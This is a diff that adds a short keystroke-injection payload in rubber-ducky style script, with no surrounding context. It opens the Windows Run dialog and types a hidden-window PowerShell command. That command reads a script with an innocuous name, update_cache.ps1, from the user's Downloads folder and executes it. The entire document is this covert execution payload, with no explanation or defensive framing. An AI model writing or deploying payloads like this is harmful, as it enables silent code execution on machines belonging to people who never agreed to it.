@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -w hidden -c "$c=Get-Content $env:USERPROFILE\Downloads\update_cache.ps1 | Out-String; [ScriptBlock]::Create($c).Invoke()"
+ENTER
